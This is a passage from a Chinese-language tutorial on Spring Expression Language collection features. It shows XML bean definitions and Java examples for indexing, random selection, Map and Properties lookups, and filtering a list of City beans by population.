rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">beans</span> xmlns=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xmlns:xsi=<span style="color: rgb(26, 188, 156);">&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xmlns:p=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/p&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xmlns:util=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/util&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">       xsi:schemaLocation=<span style="color: rgb(26, 188, 156);">&#34;http://www.springframework.org/schema/beans</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);"><span style="color: rgb(26, 188, 156);">    http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);"><span style="color: rgb(26, 188, 156);">    http://www.springframework.org/schema/util</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);"><span style="color: rgb(26, 188, 156);">    http://www.springframework.org/schema/util/spring-util-4.0.xsd&#34;</span>&gt;</span></span><br/><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">util:list</span> id=<span style="color: rgb(26, 188, 156);">&#34;cities&#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.City&#34;</span> p:name=<span style="color: rgb(26, 188, 156);">&#34;Chicago&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">              p:state=<span style="color: rgb(26, 188, 156);">&#34;IL&#34;</span> p:population=<span style="color: rgb(26, 188, 156);">&#34;2853114&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.City&#34;</span> p:name=<span style="color: rgb(26, 188, 156);">&#34;Atlanta&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">              p:state=<span style="color: rgb(26, 188, 156);">&#34;GA&#34;</span> p:population=<span style="color: rgb(26, 188, 156);">&#34;537958&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.City&#34;</span> p:name=<span style="color: rgb(26, 188, 156);">&#34;Dallas&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">              p:state=<span style="color: rgb(26, 188, 156);">&#34;TX&#34;</span> p:population=<span style="color: rgb(26, 188, 156);">&#34;1279910&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.City&#34;</span> p:name=<span style="color: rgb(26, 188, 156);">&#34;Houston&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">              p:state=<span style="color: rgb(26, 188, 156);">&#34;TX&#34;</span> p:population=<span style="color: rgb(26, 188, 156);">&#34;2242193&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.City&#34;</span> p:name=<span style="color: rgb(26, 188, 156);">&#34;Odessa&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">              p:state=<span style="color: rgb(26, 188, 156);">&#34;TX&#34;</span> p:population=<span style="color: rgb(26, 188, 156);">&#34;90943&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.City&#34;</span> p:name=<span style="color: rgb(26, 188, 156);">&#34;El Paso&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">              p:state=<span style="color: rgb(26, 188, 156);">&#34;TX&#34;</span> p:population=<span style="color: rgb(26, 188, 156);">&#34;613190&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.City&#34;</span> p:name=<span style="color: rgb(26, 188, 156);">&#34;Jal&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">              p:state=<span style="color: rgb(26, 188, 156);">&#34;NM&#34;</span> p:population=<span style="color: rgb(26, 188, 156);">&#34;1996&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.City&#34;</span> p:name=<span style="color: rgb(26, 188, 156);">&#34;Las Cruces&#34;</span></span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">              p:state=<span style="color: rgb(26, 188, 156);">&#34;NM&#34;</span> p:population=<span style="color: rgb(26, 188, 156);">&#34;91865&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">util:list</span>&gt;</span></span><br/><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">beans</span>&gt;</span></span><br/></pre></td></tr></tbody></table>#### 访问集合成员  
  
SpEL表达式支持通过#{集合ID[i]}的方式来访问集合中的成员。  
  
定义一个ChoseCity类：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> ChoseCity </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> City city;</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> setCity(City city) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">this</span>.city = city;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> City getCity() </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">return</span> city;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
在Beans.xml中，选取集合中的某一个成员，并赋值给city属性中：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;choseCity&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.ChoseCity&#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">	<span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;city&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{cities[0]}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">bean</span>&gt;</span></span><br/></pre></td></tr></tbody></table>  
MainApp.java，实例化这个Bean：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.context.ApplicationContext;</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> MainApp </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">static</span> <span style="color: rgb(0, 146, 219);">void</span> main(String[] args) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        ApplicationContext context = <span style="color: rgb(233, 105, 0);">new</span> ClassPathXmlApplicationContext(<span style="color: rgb(26, 188, 156);">&#34;Beans.xml&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">        ChoseCity c = (ChoseCity)context.getBean(<span style="color: rgb(26, 188, 156);">&#34;choseCity&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">        System.out.println(c.getCity().getName());</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
运行无误则输出”Chicago”。  
  
随机地选择一个city，中括号[]运算符始终通过索引访问集合中的成员：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;city&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{cities[T(java.lang.Math).random()*cities.size()]}&#34;</span>/&gt;</span></span><br/></pre></td></tr></tbody></table>  
此时会随机访问一个集合成员并输出。  
> []运算符同样可以用来获取java.util.Map集合中的成员。例如，假设City对象以其名字作为键放入Map集合中，在这种情况下，我们可以像下面那样获取键为Dallas的entry：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;chosenCity&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{cities[&#39;Dallas&#39;]}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> []运算符的另一种用法是从java.util.Properties集合中取值。例如，假设我们需要通过<util:properties>元素在Spring中加载一个properties配置文件：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">util:properties</span> id=<span style="color: rgb(26, 188, 156);">&#34;settings&#34;</span> loaction=<span style="color: rgb(26, 188, 156);">&#34;classpath:settings.properties&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> 现在要在这个配置文件Bean中访问一个名为twitter.accessToken的属性：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; <span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;accessToken&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{settings[&#39;twitter.accessToken&#39;]}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
> []运算符同样可以通过索引来得到某个字符串的某个字符，例如下面的表达式将返回s：  
> <table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;">&gt; &#39;This is a test&#39;[3]</span><br/><span style="height: 20px;line-height: 20px;">&gt;</span><br/></pre></td></tr></tbody></table>  
  
#### 查询集合成员  
  
SpEL表达式中提供了查询运算符来实现查询符合条件的集合成员：  
- .?[]：返回所有符合条件的集合成员；  
  
- .^[]：从集合查询中查出第一个符合条件的集合成员；  
  
- .$[]：从集合查询中查出最后一个符合条件的集合成员；  
  
修改ChoseCity类，将city属性类型改为City列表类型：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> java.util.List;</span><br/><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> ChoseCity </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(233, 105, 0);">private</span> List&lt;City&gt; city;</span><br/><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> List&lt;City&gt; getCity() </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">return</span> city;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">void</span> setCity(List&lt;City&gt; city) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">this</span>.city = city;</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
修改Beans.xml：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">bean</span> id=<span style="color: rgb(26, 188, 156);">&#34;choseCity&#34;</span> class=<span style="color: rgb(26, 188, 156);">&#34;com.mi1k7ea.ChoseCity&#34;</span>&gt;</span></span><br/><span style="height: 20px;line-height: 20px;">	<span style="color: rgb(41, 115, 183);">&lt;<span style="color: rgb(82, 82, 82);">property</span> name=<span style="color: rgb(26, 188, 156);">&#34;city&#34;</span> value=<span style="color: rgb(26, 188, 156);">&#34;#{cities.?[population gt 100000]}&#34;</span>/&gt;</span></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(41, 115, 183);">&lt;/<span style="color: rgb(82, 82, 82);">bean</span>&gt;</span></span><br/></pre></td></tr></tbody></table>  
修改MainApp.java：  
  
<table><tbody><tr style="border-top: 1px solid rgb(204, 204, 204);background-color: white;border-right: none !important;border-bottom: none !important;border-left: none !important;"><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);"><pre style="overflow: hidden;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(239, 242, 243);color: rgb(134, 145, 148);text-align: center;"><span style="height: 20px;line-height: 20px;">1</span><br/><span style="height: 20px;line-height: 20px;">2</span><br/><span style="height: 20px;line-height: 20px;">3</span><br/><span style="height: 20px;line-height: 20px;">4</span><br/><span style="height: 20px;line-height: 20px;">5</span><br/><span style="height: 20px;line-height: 20px;">6</span><br/><span style="height: 20px;line-height: 20px;">7</span><br/><span style="height: 20px;line-height: 20px;">8</span><br/><span style="height: 20px;line-height: 20px;">9</span><br/><span style="height: 20px;line-height: 20px;">10</span><br/><span style="height: 20px;line-height: 20px;">11</span><br/><span style="height: 20px;line-height: 20px;">12</span><br/><span style="height: 20px;line-height: 20px;">13</span><br/><span style="height: 20px;line-height: 20px;">14</span><br/></pre></td><td style="padding: 6px 13px;border-color: rgb(204, 204, 204);font-size: 0.8rem;"><pre style="overflow: auto;font-family: &#34;Source Code Pro&#34;, &#34;courier new&#34;, &#34;Input Mono&#34;, &#34;PT Mono&#34;, Consolas, Monaco, Menlo, monospace;font-size: 1em;padding: 10px;background-color: rgb(246, 246, 246);"><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">package</span> com.mi1k7ea;</span><br/><span style="height: 20px;line-height: 20px;"></span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.context.ApplicationContext;</span><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">import</span> org.springframework.context.support.ClassPathXmlApplicationContext;</span><br/><br/><span style="height: 20px;line-height: 20px;"><span style="color: rgb(233, 105, 0);">public</span> <span style="color: rgb(41, 115, 183);"><span style="color: rgb(233, 105, 0);">class</span> MainApp </span>{</span><br/><span style="height: 20px;line-height: 20px;">    <span style="color: rgb(82, 82, 82);"><span style="color: rgb(0, 146, 219);">public</span> <span style="color: rgb(0, 146, 219);">static</span> <span style="color: rgb(0, 146, 219);">void</span> main(String[] args) </span>{</span><br/><span style="height: 20px;line-height: 20px;">        ApplicationContext context = <span style="color: rgb(233, 105, 0);">new</span> ClassPathXmlApplicationContext(<span style="color: rgb(26, 188, 156);">&#34;Beans.xml&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">        ChoseCity c = (ChoseCity)context.getBean(<span style="color: rgb(26, 188, 156);">&#34;choseCity&#34;</span>);</span><br/><span style="height: 20px;line-height: 20px;">        <span style="color: rgb(233, 105, 0);">for</span>(City city:c.getCity()){</span><br/><span style="height: 20px;line-height: 20px;">            System.out.println(city.getName());</span><br/><span style="height: 20px;line-height: 20px;">        }</span><br/><span style="height: 20px;line-height: 20px;">    }</span><br/><span style="height: 20px;line-height: 20px;">}</span><br/></pre></td></tr></tbody></table>  
运行输出：  
  
